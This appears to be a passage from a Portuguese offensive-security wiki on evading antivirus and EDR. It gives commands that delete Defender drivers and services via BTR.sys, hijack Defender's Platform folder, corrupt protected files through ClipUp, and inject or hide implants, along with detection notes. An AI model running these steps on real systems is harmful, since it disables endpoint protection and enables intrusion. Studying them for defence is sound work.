[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa a cadeia completa: extrair o `BTR.sys` do Defender local, criar `<random>.sys:changelist` e um stream de feedback, serializar/verificar o checksum/criptografar actions encadeadas, criar diretamente a chave do registro do serviço e, em seguida, chamar `NtLoadDriver` para `-trigger now` ou deixá-lo como um driver iniciado pelo sistema para `-trigger boot`. O staging direto no registro evita o caminho normal `CreateServiceW` do SCM e, portanto, **não produz o Event ID 7045 de instalação de serviço**. Artefatos acionados na inicialização podem ser removidos posteriormente com `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` não é utilizável porque o BTR executa operações de I/O de arquivos a partir de `DriverEntry`, antes que a storage stack e o link `SystemRoot` estejam prontos. `Start=1`, juntamente com o grupo de alta prioridade `Boot Bus Extender`, é executado na Phase 1: o NTFS está utilizável, mas muitos security drivers de system-start e serviços EDR em user-mode ainda não foram inicializados. Filtros de boot-start, como `WdFilter`, talvez já estejam carregados, mas o BTR pode remover seus binários ou a configuração do serviço antes do próximo start e pode excluir executáveis de serviços antes que o SCM os inicie. O ELAM não fecha essa lacuna porque o BTR é executado após a avaliação de boot-start e possui uma assinatura válida da Microsoft.<sup>[[36]](#references)</sup>

Várias ações são executadas em uma única transação. O PoC insere a Action 1 para o caminho fixo `\SystemRoot\Temp\BootClean.log`: o BTR cria esse log, depois consome sua própria solicitação de exclusão e o remove antes de descarregar. Isso reduz as evidências, enquanto colocar o feedback em `<random>.sys:<random>.dat` permite remover o driver e ambos os streams juntos.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlações de detecção de alto sinal

Regras baseadas apenas em assinaturas e a Microsoft vulnerable-driver blocklist não abordam o abuso da funcionalidade pretendida do BTR. Prefira estas correlações comportamentais, distinguindo a linhagem legítima do Defender de um launcher arbitrário.<sup>[[36]](#references)</sup>

- **Sysmon 15:** a criação de `.sys:changelist` é universal no staging do BTR. Um ADS `.dat` anexado ao mesmo `.sys` é especialmente suspeito porque o Defender legítimo normalmente coloca o feedback em `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sem System 7045:** correlacione a criação direta de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contendo `Args=...:changelist` e `Group=Boot Bus Extender` sem um evento de instalação correspondente do SCM.
- **Sysmon 6 -> 23:** correlacione o carregamento de um driver BTR conhecido de uma linhagem que não seja do Defender com a exclusão subsequente de arquivos atribuída a `System`/PID 4, especialmente no caso de binários de segurança.
- **Sysmon 11 -> 23:** gere um alerta para a criação e exclusão rápidas de `\SystemRoot\Temp\BootClean.log` por `System`/PID 4.
- Restrinja e audite a atribuição/ativação de `SeLoadDriverPrivilege`; uma assinatura da Microsoft, por si só, não é confiança suficiente quando um driver de security-tool é colocado em staging por `cmd.exe`, PowerShell ou um processo desconhecido.

## Abusando do Protected Process Light (PPL) para adulterar AV/EDR com LOLBINs

O Protected Process Light (PPL) impõe uma hierarquia de signer/level, de modo que apenas protected processes de nível igual ou superior possam adulterar uns aos outros. Ofensivamente, se você puder iniciar legitimamente um binário habilitado para PPL e controlar seus argumentos, poderá converter uma funcionalidade benigna (por exemplo, logging) em uma write primitive restrita e apoiada por PPL contra diretórios protegidos usados por AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

O que faz um processo ser executado como PPL
- O EXE de destino (e quaisquer DLLs carregadas) deve estar assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve ser solicitado um protection level compatível que corresponda ao signer do binário (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para anti-malware signers, `PROTECTION_LEVEL_WINDOWS` para Windows signers). Níveis incorretos farão a criação falhar.

Consulte também uma introdução mais ampla a PP/PPL e à proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Ferramentas de Launcher
- Helper open-source: CreateProcessAsPPL (seleciona o protection level e encaminha os argumentos para o EXE de destino):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Padrão de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` gera seu próprio processo filho e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre com proteção PPL.
- O ClipUp não consegue analisar caminhos que contenham espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

Auxiliares de caminhos curtos 8.3
- Listar nomes curtos: `dir /x` em cada diretório pai.
- Obter o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadeia de abuso (abstrata)
1) Inicie o LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho do log do ClipUp para forçar a criação de um arquivo em um diretório protegido do AV (por exemplo, Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário de destino normalmente estiver aberto/bloqueado pelo AV durante a execução (por exemplo, MsMpEng.exe), agende a gravação no boot, antes de o AV iniciar, instalando um serviço de inicialização automática que seja executado anteriormente de forma confiável. Valide a ordem de inicialização com o Process Monitor (boot logging).
4) Na reinicialização, a gravação respaldada por PPL ocorre antes que o AV bloqueie seus binários, corrompendo o arquivo de destino e impedindo a inicialização.

Exemplo de invocação (caminhos ocultados/abreviados por segurança):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Observações e restrições
- Você não pode controlar o conteúdo que o ClipUp grava, apenas o local; a primitiva é adequada para corrupção, não para injeção precisa de conteúdo.
- Requer privilégios de administrador local/SYSTEM para instalar/iniciar um serviço e uma janela para reinicialização.
- O timing é crítico: o alvo não pode estar aberto; a execução no boot evita file locks.

Detecções
- Criação do processo `ClipUp.exe` com argumentos incomuns, especialmente quando iniciado por launchers não padrão, próximo ao boot.
- Novos serviços configurados para iniciar automaticamente binários suspeitos e iniciados consistentemente antes do Defender/AV. Investigue a criação/modificação de serviços antes das falhas de inicialização do Defender.
- Monitoramento da integridade de arquivos nos binários/diretórios do Defender/Platform; criações/modificações inesperadas por processos com protected-process flags.
- Telemetria ETW/EDR: procure processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de níveis PPL por binários que não sejam de AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem ser executados como PPL e sob quais processos-pai; bloqueie a invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja a criação/modificação de serviços de inicialização automática e monitore a manipulação da ordem de inicialização.
- Garanta que a proteção contra adulteração do Defender e as proteções de early-launch estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se isso for compatível com seu ambiente (teste cuidadosamente).

## Adulterando o Microsoft Defender via Hijack de Symlink da Pasta de Versão da Platform

O Windows Defender escolhe a Platform a partir da qual é executado enumerando as subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a string de versão lexicograficamente mais alta (por exemplo, `4.18.25070.5-0`) e inicia os processos do serviço do Defender a partir dela (atualizando os caminhos do serviço/registry de acordo). Essa seleção confia nas entradas de diretório, incluindo directory reparse points (symlinks). Um administrador pode explorar isso para redirecionar o Defender para um caminho gravável pelo atacante e obter DLL sideloading ou interrupção do serviço.<sup>[[21]](#references)[[22]](#references)</sup>

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks na pasta Platform)
- Capacidade de reinicializar ou acionar uma nova seleção da Platform do Defender (reinicialização do serviço no boot)
- Apenas ferramentas integradas são necessárias (mklink)

Por que funciona
- O Defender bloqueia gravações em suas próprias pastas, mas sua seleção da Platform confia nas entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar se o destino resolve para um caminho protegido/confiável.

Passo a passo (exemplo)
1) Prepare um clone gravável da pasta Platform atual, por exemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório de versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção do gatilho (reboot recomendado):
```cmd
shutdown /r /t 0
```
4) Verifique se o MsMpEng.exe (WinDefend) é executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração do serviço/registro refletindo esse local.

Opções pós-exploração
- DLL sideloading/execução de código: solte/substitua DLLs que o Defender carrega do diretório da aplicação para executar código nos processos do Defender. Consulte a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Encerramento/negação do serviço: remova o symlink da versão para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Observe que esta técnica não fornece privilege escalation por si só; ela requer privilégios de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams podem mover a evasão em runtime para fora do implante C2 e colocá-la no próprio módulo-alvo, fazendo hooking da sua Import Address Table (IAT) e roteando APIs selecionadas por meio de código position-independent (PIC) controlado pelo atacante. Isso generaliza a evasão para além da pequena superfície de APIs que muitos kits expõem (por exemplo, CreateProcessA) e estende as mesmas proteções a BOFs e post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Abordagem de alto nível
- Faça o stage de um blob PIC junto ao módulo-alvo usando um reflective loader (prepending ou companion). O PIC deve ser self-contained e position-independent.
- À medida que a host DLL é carregada, percorra seu IMAGE_IMPORT_DESCRIPTOR e faça o patch das entradas da IAT referentes às imports-alvo (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para apontarem para thin PIC wrappers.
- Cada PIC wrapper executa evasions antes de fazer tail-call para o endereço da API real. Evasions típicas incluem:
- Mask/unmask de memória ao redor da chamada (por exemplo, criptografar regiões do beacon, RWX→RX, alterar nomes/permissões de páginas) e restaurar após a chamada.
- Call-stack spoofing: construir uma stack benigna e fazer a transição para a API-alvo, para que a análise da call stack resolva para os frames esperados.<sup>[[9]](#references)</sup>
- Para compatibilidade, exporte uma interface para que um Aggressor script (ou equivalente) possa registrar quais APIs devem sofrer hooking para Beacon, BOFs e post-ex DLLs.

Por que usar IAT hooking aqui
- Funciona para qualquer código que use a import submetida a hooking, sem modificar o código da ferramenta nem depender do Beacon para fazer proxy de APIs específicas.
- Abrange post-ex DLLs: fazer hooking de LoadLibrary* permite interceptar carregamentos de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar a mesma evasão de masking/stack às suas chamadas de API.
- Restaura o uso confiável de comandos post-ex de criação de processos contra detecções baseadas em call stack, envolvendo CreateProcessA/W em wrappers.

Esboço mínimo de IAT hook (pseudocódigo x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após as relocations/ASLR e antes do primeiro uso da import. Reflective loaders como TitanLdr/AceLdr demonstram o hooking durante o DllMain do módulo carregado.
- Mantenha os wrappers pequenos e compatíveis com PIC; resolva a API verdadeira por meio do valor original da IAT capturado antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas graváveis+executáveis.

Stub de call-stack spoofing
- Stubs PIC no estilo Draugr constroem uma call chain falsa (return addresses dentro de módulos benignos) e então fazem pivot para a API real.
- Isso derrota detecções que esperam stacks canônicas de Beacon/BOFs para APIs sensíveis.
- Combine com técnicas de stack cutting/stack stitching para pousar dentro dos frames esperados antes do prólogo da API.

Integração operacional
- Prepend o reflective loader aos post-ex DLLs para que o PIC e os hooks sejam inicializados automaticamente quando a DLL for carregada.
- Use um Aggressor script para registrar as APIs-alvo, permitindo que Beacon e BOFs se beneficiem de forma transparente do mesmo caminho de evasão, sem alterações no código.

Considerações de detecção/DFIR
- Integridade da IAT: entradas que resolvem para endereços não pertencentes a uma image (heap/anon); verificação periódica dos import pointers.
- Anomalias de stack: return addresses que não pertencem a loaded images; transições abruptas para PIC não pertencente a uma image; ancestralidade inconsistente de RtlUserThreadStart.
- Telemetria do loader: gravações in-process na IAT, atividade inicial de DllMain que modifica import thunks, regiões RX inesperadas criadas durante o load.
- Evasão de image-load: se houver hooking de LoadLibrary*, monitore loads suspeitos de assemblies de automação/clr correlacionados com eventos de memory masking.

Blocos de construção e exemplos relacionados
- Reflective loaders que executam IAT patching durante o load (por exemplo, TitanLdr, AceLdr)
- Hooks de memory masking (por exemplo, simplehook) e PIC de stack-cutting (stackcutting)
- Stubs PIC de call-stack spoofing (por exemplo, Draugr)


## IAT Hooking no Momento da Import + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks no momento da import via um PICO residente

Se você controla um reflective loader, pode fazer hooking das imports **durante** `ProcessImports()` substituindo o ponteiro `GetProcAddress` do loader por um resolver customizado que verifica os hooks primeiro:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crie um **PICO residente** (objeto PIC persistente) que sobreviva depois que o PIC transitório do loader liberar a si próprio.
- Exporte uma função `setup_hooks()` que sobrescreva o import resolver do loader (por exemplo, `funcs.GetProcAddress = _GetProcAddress`).
- Em `_GetProcAddress`, ignore imports por ordinal e use uma busca de hooks baseada em hash, como `__resolve_hook(ror13hash(name))`. Se existir um hook, retorne-o; caso contrário, delegue para o `GetProcAddress` real.
- Registre os alvos dos hooks em tempo de link com entradas `addhook "MODULE$Func" "hook"` do Crystal Palace. O hook permanece válido porque fica dentro do PICO residente.

Isso produz **redirecionamento da IAT no momento da import** sem fazer patching na seção de código da DLL carregada após o load.

### Forçando imports hookable quando o alvo usa PEB-walking

Os hooks no momento da import só são acionados se a função estiver de fato na IAT do alvo. Se um módulo resolver APIs via PEB-walk + hash (sem entrada de import), force uma import real para que o caminho `ProcessImports()` do loader a detecte:

- Substitua a resolução de exports baseada em hash (por exemplo, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por uma referência direta como `&WaitForSingleObject`.
- O compilador emitirá uma entrada na IAT, permitindo a interceptação quando o reflective loader resolver as imports.

### Sleep/idle obfuscation no estilo Ekko sem fazer patching de `Sleep()`

Em vez de fazer patching de `Sleep`, faça hooking das **primitivas reais de wait/IPC** usadas pelo implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para waits longos, envolva a chamada em uma chain de obfuscation no estilo Ekko que encripta a imagem em memória durante o idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Use `CreateTimerQueueTimer` para agendar uma sequência de callbacks que chamam `NtContinue` com frames `CONTEXT` preparados.
- Chain típica (x64): definir a imagem como `PAGE_READWRITE` → encriptar com RC4 via `advapi32!SystemFunction032` sobre toda a imagem mapeada → executar o wait bloqueante → desencriptar com RC4 → **restaurar as permissões por seção** percorrendo as seções PE → sinalizar a conclusão.
- `RtlCaptureContext` fornece um `CONTEXT` de template; clone-o em múltiplos frames e defina os registradores (`Rip/Rcx/Rdx/R8/R9`) para invocar cada etapa.

Detalhe operacional: retorne “success” para waits longos (por exemplo, `WAIT_OBJECT_0`) para que o caller continue enquanto a imagem estiver mascarada. Esse padrão oculta o módulo dos scanners durante as janelas de idle e evita a assinatura clássica de “`Sleep()` patched”.

Ideias de detecção (baseadas em telemetria)
- Rajadas de callbacks de `CreateTimerQueueTimer` apontando para `NtContinue`.
- `advapi32!SystemFunction032` usado em buffers contíguos grandes, do tamanho de uma imagem.
- `VirtualProtect` em grandes intervalos, seguido pela restauração customizada das permissões por seção.

### Registro de CFG em runtime para gadgets de sleep-obfuscation

Em alvos com CFG habilitado, o primeiro salto indireto para um gadget no meio de uma função, como `jmp [rbx]` ou `jmp rdi`, normalmente fará o processo crashar com `STATUS_STACK_BUFFER_OVERRUN`, pois o gadget não está presente nos metadados de CFG do módulo. Para manter chains no estilo Ekko/Kraken ativas dentro de processos hardened:<sup>[[30]](#references)</sup>

- Registre todos os destinos indiretos usados pela chain com `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entradas `CFG_CALL_TARGET_VALID`.
- Para endereços dentro de loaded images (`ntdll`, `kernel32`, `advapi32`), o `MEMORY_RANGE_ENTRY` deve começar na **base da image** e abranger o **tamanho completo da image**.
- Para regiões manualmente mapeadas/PIC/stomped, use a **allocation base** e o tamanho da allocation.
- Marque não apenas o dispatch gadget, mas também os exports alcançados indiretamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls de wait/event) e quaisquer seções executáveis controladas pelo atacante que se tornarão destinos indiretos.

Isso transforma chains de sleep no estilo ROP/JOP de algo que “funciona apenas em processos sem CFG” em uma primitive reutilizável para `explorer.exe`, browsers, `svchost.exe` e outros endpoints compilados com `/guard:cf`.

### Stack spoofing compatível com CET para threads em sleep

A substituição completa de `CONTEXT` é ruidosa e pode falhar em sistemas com CET Shadow Stack, pois um `Rip` spoofed ainda precisa concordar com a shadow stack de hardware. Um padrão mais seguro de sleep-masking é:<sup>[[30]](#references)</sup>

- Escolha outra thread no mesmo processo e leia os limites de stack do `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Faça backup do TEB/TIB real da thread atual.
- Capture o contexto real da thread em sleep com `GetThreadContext`.
- Copie **apenas o `Rip`** real para o contexto spoofed, mantendo intacto o `Rsp`/estado de stack spoofed.
- Durante a janela de sleep, copie o `NT_TIB` da thread spoofed para o TEB atual, para que os stack walkers façam unwind dentro de um intervalo de stack legítimo.
- Após o término do wait, restaure o TIB original e o contexto da thread.

Isso preserva um instruction pointer consistente com CET enquanto engana os stack walkers de EDR que confiam nos metadados de stack do TEB para validar os unwinds.

### Alternativa baseada em APC: Kraken Mask

Se o dispatch de timer-queue produzir assinaturas demais, a mesma sequência de sleep-encrypt-spoof-restore poderá ser executada a partir de uma helper thread suspensa usando APCs enfileiradas:<sup>[[27]](#references)</sup>

- Crie uma helper thread com `NtTestAlert` como entrypoint.
- Enfileire frames `CONTEXT`/APCs preparados com `NtQueueApcThread` e descarregue-os com `NtAlertResumeThread`.
- Armazene o estado da chain no heap, em vez da stack da helper, para evitar esgotar a stack padrão de 64 KB da thread.
- Use `NtSignalAndWaitForSingleObject` para sinalizar atomicamente o start event e bloquear.
- Suspenda a main thread antes de restaurar o TIB/contexto (`NtSuspendThread` → restore → `NtResumeThread`) para reduzir a race window em que um scanner poderia capturar uma stack parcialmente restaurada.

Isso troca a assinatura `CreateTimerQueueTimer` + `NtContinue` por uma assinatura de helper-thread/APC, mantendo os mesmos objetivos de RC4 masking e stack-spoofing.

Ideias adicionais de detecção
- `NtSetInformationVirtualMemory` com `VmCfgCallTargetInformation` pouco antes de sleeps, waits ou dispatch de APC.
- `GetThreadContext`/`SetThreadContext` envolvendo `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de gravações diretas nos limites de stack do TEB/TIB da thread atual.
- Chains de `NtQueueApcThread`/`NtAlertResumeThread` que alcançam indiretamente `SystemFunction032`, `VirtualProtect` ou helpers de restauração de permissões de seção.
- Uso repetido de assinaturas curtas de gadgets, como `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`), como pivots de dispatch dentro de módulos assinados.


## Precision Module Stomping

Module stomping executa payloads a partir da **seção `.text` de uma DLL já mapeada dentro do processo-alvo**, em vez de alocar memória executável privada óbvia ou carregar uma DLL sacrificial nova. O alvo do overwrite deve ser uma **image carregada e apoiada em disco** cujo espaço de código possa absorver o payload sem corromper code paths que o processo ainda precise usar.<sup>[[1]](#references)[[2]](#references)</sup>

### Seleção confiável do alvo

Stomping ingênuo contra módulos comuns, como `uxtheme.dll` ou `comctl32.dll`, é frágil: a DLL pode não estar carregada no processo remoto, e uma região de código pequena demais causará o crash do processo. Um workflow mais confiável é:

1. Enumere os módulos do processo-alvo e mantenha uma **include list contendo apenas nomes** de DLLs já carregadas.
2. Primeiro faça o build do payload e registre seu **tamanho exato em bytes**.
3. Faça scan das DLLs candidatas no disco e compare o **`Misc_VirtualSize` da seção PE `.text`** com o tamanho do payload. Isso é mais importante que o tamanho do arquivo, pois reflete o tamanho da seção executável **quando mapeada na memória**.
4. Faça parse da **Export Address Table (EAT)** e escolha o RVA de uma função exportada como offset inicial do stomp.
5. Calcule o **blast radius**: se o payload exceder o limite da função selecionada, ele sobrescreverá exports adjacentes posicionados depois dela na memória.

Helpers típicos de recon/seleção observados na prática:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notas operacionais
- Prefira DLLs **já carregadas** no processo remoto para evitar a telemetria de `LoadLibrary`/carregamentos inesperados de imagens.
- Prefira exports que raramente sejam executados pela aplicação-alvo; caso contrário, caminhos normais do código podem atingir os bytes sobrescritos antes ou depois da criação da thread.
- Implants grandes geralmente exigem alterar a incorporação do shellcode de um literal de string para um **array de bytes/inicializador entre chaves**, para que o buffer completo seja representado corretamente no código-fonte do injector.

Ideias de detecção
- Escritas remotas em **páginas executáveis respaldadas por imagens** (`MEM_IMAGE`, `PAGE_EXECUTE*`), em vez das alocações privadas RWX/RX mais comuns.
- Pontos de entrada de exports cujos bytes na memória não correspondem mais ao arquivo de origem no disco.
- Threads remotas ou pivôs de contexto que começam a execução dentro de um export legítimo de DLL cujos primeiros bytes foram modificados recentemente.
- Sequências suspeitas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLLs seguidas pela criação de uma thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) é uma técnica de **process-injection / EDR-evasion** que evita o caminho clássico de escrita remota (`VirtualAllocEx` + `WriteProcessMemory`). Em vez de copiar bytes para um target já em execução, ela explora o fato de que o Windows **copia parâmetros de inicialização selecionados de `CreateProcessW` para o processo filho** e os armazena em `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers envenenáveis copiados por `CreateProcessW`

Carriers úteis são:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (com `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Restrições práticas dos carriers:

- `lpCommandLine` deve apontar para memória **gravável** para `CreateProcessW` e é limitado a **32.767 caracteres Unicode**, incluindo o terminador nulo.
- `lpEnvironment` deve ser um bloco de ambiente Unicode composto por strings sucessivas `NAME=VALUE\0`, terminadas por um `\0` extra.
- `lpReserved` é oficialmente reservado; portanto, o mapeamento para `ShellInfo` deve ser tratado como um detalhe de implementação, e não como um contrato documentado estável.

Isso transforma a criação normal de processos na **primitive de transferência do payload**. O operador cria o processo filho com dados de inicialização controlados pelo atacante e permite que o Windows execute a cópia entre processos.

### Fluxo de lookup remoto sem APIs de escrita remota

Depois que o processo filho é criado, resolva o buffer copiado usando primitives somente de leitura:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obter `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ler o `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Ler `RTL_USER_PROCESS_PARAMETERS`
5. Usar o ponteiro selecionado:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Fluxo mínimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Executando o buffer de parâmetros copiado

A região de parâmetros copiada geralmente é `RW`, não executável. Uma cadeia P3 comum é:

1. Criar o processo normalmente (não suspenso)
2. Tornar a página de parâmetros escolhida executável com `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar o handle da thread principal já retornado em `PROCESS_INFORMATION`
4. Redirecionar a execução com `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescrever `RIP`)

Ao contrário dos workflows clássicos de hijacking de threads, isso **não requer** `SuspendThread` / `ResumeThread`; o contexto pode ser alterado diretamente no handle da thread principal retornado.

Isso evita várias APIs normalmente monitoradas para injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- frequentemente também `SuspendThread` / `ResumeThread`

### Limitação de bytes nulos e staged shellcode

Os três carriers são **dados de string ou semelhantes a strings**, portanto um payload bruto contendo `0x00` é truncado durante a transferência. Uma solução prática é um **first stage sem bytes nulos** que reconstrói constantes em runtime e depois carrega um second stage arbitrário.

Um padrão simples é a síntese de constantes baseada em XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Isso permite que o primeiro estágio construa strings de stack, argumentos de API, caminhos de DLL ou um loader de shellcode de segundo estágio sem incorporar bytes nulos no parâmetro transportado.

### Chamadas de API baseadas em stack a partir do primeiro estágio

Quando o primeiro estágio precisa chamar APIs como `LoadLibraryA`, ele pode:

- colocar a string/buffer na stack do alvo
- reservar o **shadow space de 32 bytes do x64**
- definir `RCX`, `RDX`, `R8`, `R9` como constantes ou ponteiros relativos a `RSP`
- manter `RSP` **alinhado a 16 bytes** antes da chamada

Um segundo estágio pode então ser copiado da stack para uma alocação `PAGE_READWRITE`, alterado para `PAGE_EXECUTE_READ` com `VirtualProtect` e executado, evitando uma alocação RWX direta.

### Ideias de detecção

Boas oportunidades de hunting mencionadas pelos autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` tornando **páginas de parâmetros do processo executáveis**
- essa alteração de proteção seguida por `SetThreadContext` / `NtSetContextThread`
- leituras remotas do `PEB` e, em seguida, de `RTL_USER_PROCESS_PARAMETERS`
- valores de `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` incomumente longos ou com alta entropia durante a criação do processo

### Observações

- P3 é um **truque de transferência entre processos**, não uma primitive de execução completa por si só: o parâmetro copiado ainda precisa de uma alteração para permissões de execução e de um método de redirecionamento da execução.
- `RtlCreateProcessReflection` / Dirty Vanity foi considerado pelos autores, mas rejeitado porque internamente chega a primitives suspeitas, como `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Tradecraft do SantaStealer para Evasão Fileless e Furto de Credenciais

SantaStealer (também conhecido como BluelineStealer) ilustra como os info-stealers modernos combinam AV bypass, anti-analysis e acesso a credenciais em um único workflow.<sup>[[24]](#references)</sup>

### Verificação do layout do teclado e atraso no sandbox

- Uma flag de configuração (`anti_cis`) enumera os layouts de teclado instalados por meio de `GetKeyboardLayoutList`. Se um layout cirílico for encontrado, o sample cria um marcador `CIS` vazio e termina antes de executar os stealers, garantindo que nunca seja detonado em locales excluídos, enquanto deixa um artefato para hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica em camadas de `check_antivm`

- A variante A percorre a lista de processos, calcula o hash de cada nome com um checksum de rolagem personalizado e compara o resultado com blocklists incorporadas de debuggers/sandboxes; ela repete o checksum sobre o nome do computador e verifica diretórios de trabalho como `C:\analysis`.
